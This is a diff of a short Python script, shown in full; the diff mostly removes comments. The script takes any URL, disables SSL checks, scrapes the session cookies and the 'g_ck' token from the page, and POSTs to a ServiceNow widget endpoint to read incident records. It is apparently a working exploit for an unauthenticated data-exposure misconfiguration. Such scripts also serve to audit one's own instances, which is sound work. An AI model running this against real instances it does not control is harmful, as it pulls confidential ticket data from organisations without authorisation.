@@ -7,26 +7,19 @@ import requests
 import json
 import re
 
-# Initialize argument parser
 parser = argparse.ArgumentParser(description='Fetch g_ck and cookies from a given URL')
 parser.add_argument('--url', required=True, help='The URL to fetch from')
 
-# Parse command-line arguments
 args = parser.parse_args()
 url = args.url.rstrip('/')  # Normalize the URL by removing any trailing slashes
 
-# Disable SSL warnings
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-# Initialize session
 s = requests.Session()
 
+# Capture cookies and g_ck variable content.
 response = s.get(url, verify=False)
-
-# Capture cookies
 cookies = s.cookies.get_dict()
-
-# Parse HTML content to find the JavaScript variable
 soup = BeautifulSoup(response.text, 'html.parser')
 script_tags = soup.find_all('script')
 
@@ -38,11 +31,9 @@ for tag in script_tags:
             g_ck_value = match.group(1)
             break
 
-# Check if the variable was found
 if not g_ck_value:
     print(f"{url} - Error: g_ck not found.")
 
-# Construct the headers for the POST request
 headers = {
     'Cookie': '; '.join([f'{k}={v}' for k, v in cookies.items()]),
     'X-UserToken': g_ck_value,
@@ -51,22 +42,17 @@ headers = {
     'Connection': 'close'
 }
 
-# URL for the POST request
 post_url = url + "/api/now/sp/widget/widget-simple-list?t=incident"
 
-# Data payload (if needed)
 data_payload = json.dumps({
     # Empty JSON payload here
 })
 
-# Send POST request
 post_response = s.post(post_url, headers=headers, data=data_payload, verify=False)
 
-# Check response
 if post_response.status_code != 200 and post_response.status_code != 201:
     print(f"{url} - Failed to send POST request.")
 
-# Parse JSON response
 response_json = post_response.json()
 
 # Check if 'result' object is not empty
